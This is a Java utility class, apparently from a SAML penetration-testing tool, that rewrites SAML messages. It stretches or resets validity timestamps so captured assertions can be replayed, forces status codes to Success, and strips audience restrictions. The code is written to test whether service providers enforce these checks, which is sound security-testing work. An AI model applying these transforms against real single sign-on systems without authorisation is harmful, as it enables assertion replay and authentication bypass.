package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

/// Simple assertion-level manipulations for SAML security testing.
///
/// These are standalone utility transforms — no CVE, no signature wrapping.
/// They expose conditions that many SP implementations fail to check:
///   - Accepting expired assertions (validity window not enforced)
///   - Processing error responses as if they succeeded (status ignored)
///   - Authenticating without audience restriction (any SP accepted)
public class AssertionManipulator {

    // --- Timestamp extension ---

    /// Extends all SAML validity timestamps by the given number of hours.
    /// Sets NotBefore to now-1h (absorbs clock skew) and pushes NotOnOrAfter /
    /// SessionNotOnOrAfter forward. IssueInstant is left unchanged.
    ///
    /// Useful for replaying captured assertions whose validity window has elapsed,
    /// and for checking whether the SP enforces time-based conditions at all.
    public static String extendValidity(String samlMessage, int hours)
            throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        long now = System.currentTimeMillis();
        String past   = samlTime(now - 3_600_000L);           // now - 1h
        String future = samlTime(now + (long) hours * 3_600_000L);

        updateAttr(document, "NotBefore",          past);
        updateAttr(document, "NotOnOrAfter",       future);
        updateAttr(document, "SessionNotOnOrAfter", future);

        return xmlHelpers.getString(document);
    }

    /// Resets all SAML timestamps to a fresh window centred on now:
    ///   IssueInstant / AuthnInstant = now
    ///   NotBefore                   = now − 1 h  (absorbs clock skew)
    ///   NotOnOrAfter / SessionNotOnOrAfter = now + 1 h
    ///
    /// Use this when replaying a captured assertion — the validity window has
    /// expired but all structural content is still what you want to test.
    public static String refreshTimestamps(String samlMessage)
            throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        long now = System.currentTimeMillis();
        String tNow   = samlTime(now);
        String past   = samlTime(now - 3_600_000L);
        String future = samlTime(now + 3_600_000L);

        updateAttr(document, "IssueInstant",        tNow);
        updateAttr(document, "AuthnInstant",         tNow);
        updateAttr(document, "NotBefore",            past);
        updateAttr(document, "NotOnOrAfter",         future);
        updateAttr(document, "SessionNotOnOrAfter",  future);

        return xmlHelpers.getString(document);
    }

    // --- Status code manipulation ---

    /// Replaces every StatusCode Value with the SAML 2.0 Success URI.
    ///
    /// Some SPs process assertions regardless of the top-level status code.
    /// This turns an error or failure response into a nominal "success" response
    /// so you can observe whether the SP checks the status before consuming the assertion.
    public static String forceStatusSuccess(String samlMessage)
            throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList statusCodes = document.getElementsByTagNameNS("*", "StatusCode");
        for (int i = 0; i < statusCodes.getLength(); i++) {
            ((Element) statusCodes.item(i)).setAttribute(
                    "Value", "urn:oasis:names:tc:SAML:2.0:status:Success");
        }

        return xmlHelpers.getString(document);
    }

    // --- Audience restriction bypass ---

    /// Removes all AudienceRestriction elements from the Conditions block.
    ///
    /// A well-configured SP rejects assertions whose Audience does not match its
    /// own entity ID. Removing the restriction tests whether the SP enforces this
    /// check — many IdP-initiated SSO flows and older implementations do not.
    public static String removeAudienceRestriction(String samlMessage)
            throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList restrictions = document.getElementsByTagNameNS("*", "AudienceRestriction");
        // Iterate in reverse to safely remove while the list is live.
        for (int i = restrictions.getLength() - 1; i >= 0; i--) {
            Node node = restrictions.item(i);
            node.getParentNode().removeChild(node);
        }

        return xmlHelpers.getString(document);
    }

    // --- Helpers ---

    private static void updateAttr(Document document, String attrName, String value) {
        NodeList all = document.getElementsByTagName("*");
        for (int i = 0; i < all.getLength(); i++) {
            Element el = (Element) all.item(i);
            if (el.hasAttribute(attrName)) {
                el.setAttribute(attrName, value);
            }
        }
    }

    private static String samlTime(long epochMillis) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
        return sdf.format(new Date(epochMillis));
    }

    private AssertionManipulator() {}
}
